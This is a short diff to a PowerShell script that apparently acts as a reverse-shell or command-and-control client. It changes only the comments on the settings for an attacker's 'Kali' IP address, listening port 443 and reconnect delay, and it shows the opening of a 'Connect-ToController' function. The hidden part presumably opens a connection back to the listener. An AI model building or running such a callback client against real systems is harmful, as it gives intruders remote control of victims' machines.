@@ -1,6 +1,6 @@
-$local_host = '192.168.232.153'  # Change this to your controller's IP
-$local_port = 443                # Change to your desired port
-$ConnectionDelay = 20                # Delay before reconnecting (seconds)
+$local_host = '192.168.232.153'  # Change this to Local Kali IP
+$local_port = 443                # Change This to Your Local Listening Port
+$ConnectionDelay = 20                # This is a Delay > Feel free to change it to fit you needs. 
 
 function Connect-ToController($local_host, $local_port) {
     try {
